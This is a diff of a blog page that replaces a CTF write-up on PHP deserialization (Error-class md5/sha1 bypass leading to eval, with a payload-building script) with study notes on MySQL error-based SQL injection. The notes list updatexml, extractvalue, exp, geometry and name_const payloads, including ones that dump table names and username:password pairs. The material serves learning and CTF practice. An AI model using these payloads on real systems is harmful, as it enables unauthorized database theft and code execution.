@@ -10,23 +10,24 @@
     <meta name="copyright" content="温柔刀">
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     <meta name="description" content="">
-    <meta name="description" content="Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp12345678910111213141516171819202122232425&lt;?php  error_reporting(0);class SYCLOVER &#123;  public $syc;  public $lover;  public function __wakeup()&amp;">
+    <meta name="description" content="SQL报错注入 - Von的博客 | Von Blog SQL–报错注入(join无列名注入)_join注入-CSDN博客 MySQL报错注入笔记 – 「配枪朱丽叶。」 主键重复报错floor()  向下取整，类似于⌊x⌋ rand(0)和 rand()  只要括号里输入的数字是一样的，rand(数字)的结果就会一直一样。 rang()生成一个位于 0 到 1 之间的数字。  一条常见的查询语句">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp">
-<meta property="og:url" content="http://example.com/2025/07/26/Exception-Error-%E7%B1%BB%E7%BB%95%E8%BF%87md5%E3%80%81sha1%E2%80%94%E2%80%94-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp/index.html">
+<meta property="og:title" content="SQL报错注入整理">
+<meta property="og:url" content="http://example.com/2025/07/28/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/index.html">
 <meta property="og:site_name" content="三重门">
-<meta property="og:description" content="Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp12345678910111213141516171819202122232425&lt;?php  error_reporting(0);class SYCLOVER &#123;  public $syc;  public $lover;  public function __wakeup()&amp;">
+<meta property="og:description" content="SQL报错注入 - Von的博客 | Von Blog SQL–报错注入(join无列名注入)_join注入-CSDN博客 MySQL报错注入笔记 – 「配枪朱丽叶。」 主键重复报错floor()  向下取整，类似于⌊x⌋ rand(0)和 rand()  只要括号里输入的数字是一样的，rand(数字)的结果就会一直一样。 rang()生成一个位于 0 到 1 之间的数字。  一条常见的查询语句">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-07-26T01:39:44.000Z">
-<meta property="article:modified_time" content="2025-07-26T04:41:53.853Z">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1753673626474-38978213-796e-46eb-8523-3160da62bc76.png">
+<meta property="article:published_time" content="2025-07-28T13:28:08.000Z">
+<meta property="article:modified_time" content="2025-07-28T13:29:00.707Z">
 <meta property="article:author" content="温柔刀">
-<meta property="article:tag" content="PHP原生类">
-<meta property="article:tag" content="wp">
+<meta property="article:tag" content="报错注入">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1753673626474-38978213-796e-46eb-8523-3160da62bc76.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
-    <title>Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp · Gentle_knife&#39;s Studio</title>
+    <title>SQL报错注入整理 · Gentle_knife&#39;s Studio</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -244,7 +245,7 @@
             <a href="/">Gentle_knife&#39;s Studio.</a>
         </div>
         <div class="post-title header-element">
-            <a href="#" class="post-name">Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp</a>
+            <a href="#" class="post-name">SQL报错注入整理</a>
         </div>
     </div>
 </header>
@@ -271,7 +272,7 @@
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-                Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp
+                SQL报错注入整理
             <!-- 404 -->
         </h1>
         <!-- 副标题 -->
@@ -283,18 +284,17 @@
             <div class="post-intros">
                 <!-- 文章页标签  -->
                     <div class="post-intro-tags" >
-        <a class="post-tag" href="javascript:void(0);" data-tags="PHP原生类">PHP原生类</a>
-        <a class="post-tag" href="javascript:void(0);" data-tags="wp">wp</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="报错注入">报错注入</a>
 </div>
 
                 <!-- 文章字数统计 -->
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">909</span>Reading time: <span class="post-count reading-time">3 min</span></span>
+                        <span>Word count: <span class="post-count word-count">2.1k</span>Reading time: <span class="post-count reading-time">8 min</span></span>
                     </div>
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
                     <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2025/07/26</span>
+                    <span class="post-intro-time">2025/07/28</span>
                     <!-- busuanzi -->
                         <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                             <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
@@ -446,70 +446,182 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h1 id="Exception-Error-类绕过md5、sha1——-极客大挑战-2020-greatphp"><a href="#Exception-Error-类绕过md5、sha1——-极客大挑战-2020-greatphp" class="headerlink" title="Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp"></a>Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+        <p><a target="_blank" rel="noopener" href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">SQL报错注入 - Von的博客 | Von Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_74020633/article/details/137156384">SQL–报错注入(join无列名注入)_join注入-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.shawroot.cc/1116.html">MySQL报错注入笔记 – 「配枪朱丽叶。」</a></p>
+<h1 id="主键重复报错"><a href="#主键重复报错" class="headerlink" title="主键重复报错"></a><font style="color:rgb(64, 64, 64);">主键重复报错</font></h1><p><strong>floor()</strong> </p>
+<p>向下取整，类似于<font style="color:rgb(31, 31, 31);">⌊x⌋</font></p>
+<p><strong><font style="color:rgb(31, 31, 31);">rand(0)和 rand() </font></strong></p>
+<p><font style="color:rgb(31, 31, 31);">只要括号里输入的数字是一样的，rand(数字)的结果就会一直一样。</font></p>
+<p><font style="color:rgb(31, 31, 31);">rang()生成一个位于 0 到 1 之间的数字。</font></p>
+<p><font style="color:rgb(31, 31, 31);"></font></p>
+<p><font style="color:rgb(31, 31, 31);">一条常见的查询语句</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55662681/1753673626474-38978213-796e-46eb-8523-3160da62bc76.png"></p>
+<p>数据库内部“按行”扫描原数据表，发现一个新的值就添加进去，发现重复的就计数＋1 直到全部读完。</p>
+<p>如果我们有以下表：</p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>username</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>Alice</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Bob</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Alice</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Carol</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Alice</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Bob</td>
+</tr>
+</tbody></table>
+<p>那么我们执行这条语句：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, COUNT(*) FROM users GROUP BY username;</span><br></pre></td></tr></table></figure>
 
-<p>看到两个强比较，以为是强碰撞，但是看到后面有过滤，还需要执行命令，不对，去原生类里面找。</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/p/15655736.html">[php安全]原生类的利用 - Aur0ra* - 博客园</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/284901">PHP原生类在安全方面的利用总结-安全KER - 安全资讯平台</a></p>
+<p>结果是：</p>
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Alice</td>
+<td>3</td>
+</tr>
+<tr>
+<td>Bob</td>
+<td>2</td>
+</tr>
+<tr>
+<td>Carol</td>
+<td>1</td>
+</tr>
+</tbody></table>
 <blockquote>
-<p>Error 和 Exception 因为有 tostring 魔术方法，将他们反序列化后只显 message 不显示错误代码，所以在同一行反序列化，md5 和 sha1 就可以绕过。</p>
+<p><font style="color:rgb(64, 64, 64);">那么，他的实现过程是如何的呢？可以联想到group by子句的执行流程，最初时，username-count(<em>)这个数据表是空的，通过一行一行读原数据表中的user字段，如果读到的user在user-count(</em>) 数据表中不存在，就将它插入，并且将对应的count(<em>) 赋为1，如果存在，就将其对应的count(</em>) +1，直至扫完整个数据表。</font></p>
 </blockquote>
-<p>Error 类是所有 PHP 内部错误类的基类，</p>
-<p>源码含有以下两行：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span> <span class="keyword">implements</span> <span class="built_in">Throwable</span> &#123;</span><br><span class="line">    <span class="comment">/* 属性 */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br></pre></td></tr></table></figure>
+<p><font style="color:rgb(64, 64, 64);"></font></p>
+<p><font style="color:rgb(64, 64, 64);">下面就是一个很有意思的机制，当我们执行这条语句：</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_">count</span><span class="params">(*)</span> from sqli group by <span class="title function_">floor</span><span class="params">(rand(<span class="number">0</span>)</span>*<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
 
-<p>message 是错误消息，code 是错误代码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
+<p>每一行都会计算floor(rand(0)*2)，结果是 0 或 1，<font style="color:rgb(64, 64, 64);">在使用group by的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次。</font></p>
+<blockquote>
+<p><font style="color:rgb(64, 64, 64);">1.查询前默认会建立空的虚拟表</font><font style="color:rgb(64, 64, 64);"><br></font><font style="color:rgb(64, 64, 64);">2.取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕</font><font style="color:rgb(64, 64, 64);"><br></font><font style="color:rgb(64, 64, 64);">3.查询第二条记录，再次计算floor(rand(0)*2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)<em>2)不会被计算第二次，直接count(</em>)加1，第二条记录查询完毕</font><font style="color:rgb(64, 64, 64);"><br></font><font style="color:rgb(64, 64, 64);">4.查询第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了</font><font style="color:rgb(64, 64, 64);"><br></font><font style="color:rgb(64, 64, 64);">5.整个查询过程floor(rand(0)<em>2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</font><font style="color:rgb(64, 64, 64);"><br></font><font style="color:rgb(64, 64, 64);">如果有一个序列开头时0,1,0或者1,0,1，则无论如何都不会报错了，因为虚表开头两个主键会分别是0和1，后面的就直接count(</em>)加1了.</font></p>
+</blockquote>
+<p>这一段如果看的很乱可以丢给 GPT 帮忙讲一下。</p>
+<p>步骤1：查询开始，虚拟表是空的。</p>
+<hr>
+<p>步骤2：读第一行数据</p>
+<ul>
+<li>第一次执行 <code>FLOOR(RAND(0)*2)</code>，得到 <strong>0</strong></li>
+<li>查虚拟表，发现没有键 0，于是要插入它</li>
+<li>但是——在真正插入表的时候，MySQL **又执行了一次 **<code>**FLOOR(RAND(0)*2)**</code>（这是它的实现机制）<ul>
+<li>第二次计算结果变成了 <strong>1</strong></li>
+</ul>
+</li>
+<li>所以最终插入的是键 <strong>1</strong></li>
+<li>现在虚表是：<code>&#123;1: 1&#125;</code>（表示键为 1 的组，计数为 1）</li>
+</ul>
+<hr>
+<p>步骤3：读第二行数据</p>
+<ul>
+<li>第三次执行 <code>FLOOR(RAND(0)*2)</code>，得到 <strong>1</strong></li>
+<li>查虚拟表：发现已经有键 1，于是把它的计数 +1</li>
+<li>虚表变成 <code>&#123;1: 2&#125;</code></li>
+</ul>
+<hr>
+<p>步骤4：读第三行数据</p>
+<ul>
+<li>第四次执行 <code>FLOOR(RAND(0)*2)</code>，得到 <strong>0</strong></li>
+<li>查虚拟表，没有键 0，准备插入</li>
+<li>插入时再次计算 <code>FLOOR(RAND(0)*2)</code>（第 5 次），结果又是 <strong>1</strong></li>
+<li>但 1 已经存在于表中了 → ❗️违反了主键唯一性 → 触发 <strong>报错！</strong></li>
+</ul>
+<p> <strong>所以至少需要三条数据才能报错，且有几率不会报错。</strong><font style="color:rgb(64, 64, 64);">如果有一个序列开头时0,1,0或者1,0,1，则无论如何都不会报错了，因为虚表开头两个主键会分别是0和1，后面的就直接count(*)加1了.</font></p>
+<p>rand()*2 由于是随机的，所以我们用它的时候有可能前两个刚好一个 0，一个 1 之后的记录只会 <code>count(*) +1</code>，**不会再试图插入新键，**所以不会触发主键冲突，不会报错。</p>
+<h1 id="xpath语法错误报错（-mysql5-1-5"><a href="#xpath语法错误报错（-mysql5-1-5" class="headerlink" title="xpath语法错误报错（&gt;mysql5.1.5)"></a><font style="color:rgb(64, 64, 64);">xpath语法错误报错（&gt;mysql5.1.5)</font></h1><p>这两个函数是用来 XML 查询和修改的，记住都能报错了。</p>
+<h2 id="updatexml-报错"><a href="#updatexml-报错" class="headerlink" title="updatexml()报错"></a>updatexml()报错</h2><p>updatexml(XML_document, XPath_string, new_value)</p>
+<p>updatexml(XML 文档名称, XPath 格式的字符串, 替换数据)</p>
+<p>因为第二个参数要求 Xpath 格式，所以我们传一个不是这个格式的就会报错，大多用十六进制的<code>~</code>，也就是 0x7e，我们把需要的数据和报错的连起来就会儿一起回显， 也就是<code>CONCAT(0x7e, (SELECT database()), 0x7e)</code>首尾随便填。</p>
+<p>从配枪朱丽叶搬运来的 payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> pname,pagefrompersonwherepwd<span class="operator">=</span><span class="string">&#x27;111&#x27;</span>andupdatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(selectdatabase()),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">爆数据库版本信息</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> @<span class="variable">@version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">链接用户</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">链接数据库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">爆库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> schema_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">爆表</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> table_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">爆字段</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> column_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">爆字段内容</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x23</span>,username,<span class="number">0x3a</span>,password,<span class="number">0x23</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 
-<p>Exception 是所有异常的基类，关键部分同上。</p>
-<p>当我们 new 了 error 类，并 echo 了这个对象，触发类的 tostring 方法：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>
+<p>@@versions 是<strong>MySQL 内置的全局变量</strong>，它的作用是：<strong>返回当前 MySQL 数据库的版本号。</strong></p>
+<h2 id="extractvalue-报错"><a href="#extractvalue-报错" class="headerlink" title="extractvalue()报错"></a><font style="color:rgb(64, 64, 64);">extractvalue()报错</font></h2><p>extractvalue(XML_document, xpath_string)</p>
+<p>extractvalue(XML 文档名称, XPath 格式的字符串)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select pname,page from person where pwd = &#x27;111&#x27; and (extractvalue(&#x27;hhhhhhh&#x27;,concat(0x7e,substring(hex((select database())),1,20))));</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(51, 51, 51);">输出如下：</font></p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Error:</span> <span class="string">payload</span> <span class="string">in</span> <span class="string">/usercode/file.php:2</span></span><br><span class="line"><span class="attr">Stack trace:</span></span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
+<p>长度限制 32 位，超过可以用</p>
+<h1 id="数据溢出报错"><a href="#数据溢出报错" class="headerlink" title="数据溢出报错"></a><font style="color:#000000;">数据溢出报错</font></h1><h2 id="双精度溢出报错"><a href="#双精度溢出报错" class="headerlink" title="双精度溢出报错"></a><font style="color:#000000;">双精度溢出报错</font></h2><p><font style="color:#000000;">Exp函数返回e的幂次方。在MySQL中。当传入的参数&gt;&#x3D;710会报错。并且会返回报错信息。利用方法如下:</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exp(~(select*from(select user())x));</span><br></pre></td></tr></table></figure>
 
-<p>会打印 message,file 和Stack trace，并不会打印 code。也就是说只要在同一个文件里 message 相同，那么打印出来的字符串就会完全相同，自然而然 md5 值就相同。</p>
-<p>回到题目，因为 md5($a)&#x3D;md5(string($a))，可以触发类的 tosring 方法，所以我们可以让 code 不同，其他部分相同，来绕过这里的本身不同但是 md5 和 sha1 相同。</p>
-<p>了解了以上知识点，我们会写出以下脚本：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$answer</span> = <span class="keyword">new</span> SYCLOVER;</span><br><span class="line"><span class="variable">$answer</span> -&gt; lover = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;echo &quot;__DIR__:&quot; . __DIR__;&#x27;</span>,<span class="string">&quot;114514&quot;</span>);</span><br><span class="line"><span class="variable">$answer</span> -&gt; syc = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;echo &quot;__DIR__:&quot; . __DIR__;&#x27;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$answer</span>));</span><br></pre></td></tr></table></figure>
+<p><font style="color:#000000;"><del>表示按位取反操作，通俗的讲就是能把一个很小的数变成一个很大的数。比如</del>0&#x3D;18446744073709551615，从而达到溢出的效果。</font></p>
+<h1 id="整型溢出报错"><a href="#整型溢出报错" class="headerlink" title="整型溢出报错"></a><font style="color:#000000;">整型溢出报错</font></h1><p><font style="color:#000000;"></font></p>
+<h1 id="几何函数报错-5-7-17-5-5-48"><a href="#几何函数报错-5-7-17-5-5-48" class="headerlink" title="几何函数报错(5.7.17-5.5.48)"></a><font style="color:#000000;">几何函数报错(</font><font style="color:#000000;">5.7.17-5.5.48)</font></h1><blockquote>
+<p><font style="color:#000000;">mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。</font></p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
 
-<p>但是拿到输出结果，会发现并没有回显，因为 tostring 的结果是包含行号的，这里我们需要把两个赋值属性放在同一行。</p>
-<p>由于我们需要保证两个属性的 message 始终一致，还需要对 message 中的命令不断进行修改，所以较好的办法是提前赋值变量。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;?&gt;&lt;?= include $_GET[_]; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$payload</span>-&gt;lover = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$a</span>);<span class="variable">$payload</span>-&gt; syc = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$a</span>,<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="列名重复报错（Mysql-5-0-12-5-0-51）"><a href="#列名重复报错（Mysql-5-0-12-5-0-51）" class="headerlink" title="列名重复报错（Mysql 5.0.12-5.0.51）"></a><font style="color:#000000;">列名重复报错</font><font style="color:#000000;">（Mysql 5.0.12-5.0.51）</font></h1><h2 id="name-const"><a href="#name-const" class="headerlink" title="name_const()"></a><font style="color:#000000;">name_const()</font></h2><p><a target="_blank" rel="noopener" href="https://www.sjkjc.com/mysql-ref/name_const/">MySQL NAME_CONST() 函数使用指南</a></p>
+<p><font style="color:#000000;">name constant 创建一个带有名字的常量值列。</font></p>
+<p><font style="color:#000000;">NAME_CONST(列名, 值)&#x3D; SELECT 值 AS 列名</font></p>
+<p><font style="color:#000000;">当我们执行：</font></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name_const(version(),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
 
